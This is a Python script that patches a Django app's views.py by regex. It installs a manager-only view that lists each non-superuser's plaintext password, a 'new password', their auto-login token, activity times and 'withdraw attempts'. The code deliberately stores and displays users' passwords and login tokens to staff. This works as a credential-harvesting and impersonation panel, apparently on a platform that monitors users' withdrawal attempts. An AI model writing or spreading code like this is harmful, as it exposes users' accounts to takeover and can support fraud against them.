import re

with open('SVEX_APP/views.py', 'r') as f:
    content = f.read()

new_func = """
@login_required(login_url='new_login')
@manager_required
def user_credentials(request):
    from .models import User, UserStats, AutoLoginToken, UserCredentials
    from django.utils import timezone
    import datetime
    
    user_tracking_list = []
    all_users = User.objects.exclude(is_superuser=True)
    now = timezone.now()
    
    for u in all_users:
        stats = UserStats.objects.filter(user=u).first()
        cred = UserCredentials.objects.filter(username=u.username).first()
        token = AutoLoginToken.objects.filter(user=u).first()
        
        m, s = divmod(stats.total_time_spent_seconds if stats else 0, 60)
        h, m = divmod(m, 60)
        time_str = f"{h}h {m}m"
        
        is_active = False
        last_active_str = "Never"
        if stats and stats.last_active:
            diff = (now - stats.last_active).total_seconds()
            if diff < 300: # Active in last 5 minutes
                is_active = True
            
            # Format last active
            if diff < 60:
                last_active_str = "Just now"
            elif diff < 3600:
                last_active_str = f"{int(diff//60)}m ago"
            elif diff < 86400:
                last_active_str = f"{int(diff//3600)}h ago"
            else:
                last_active_str = f"{int(diff//86400)}d ago"

        user_tracking_list.append({
            "username": u.username,
            "email": u.email,
            "password": cred.password if cred else "N/A",
            "new_password": cred.new_password if cred else "N/A",
            "token": token.token if token else None,
            "time_spent": time_str,
            "logins": stats.total_logins if stats else 0,
            "withdraw_attempts": stats.withdraw_attempts if stats else 0,
            "is_active": is_active,
            "last_active_str": last_active_str
        })
    return render(request, "SVEX_APP/client_credentials.html", {"data": user_tracking_list})
"""

# We need to replace the old user_credentials function
content = re.sub(r'@login_required\(login_url=\'new_login\'\)\n@manager_required\ndef user_credentials\(request\):[\s\S]*?return render\(request, "SVEX_APP/client_credentials\.html", {"data": user_tracking_list}\)', new_func.strip(), content)

with open('SVEX_APP/views.py', 'w') as f:
    f.write(content)
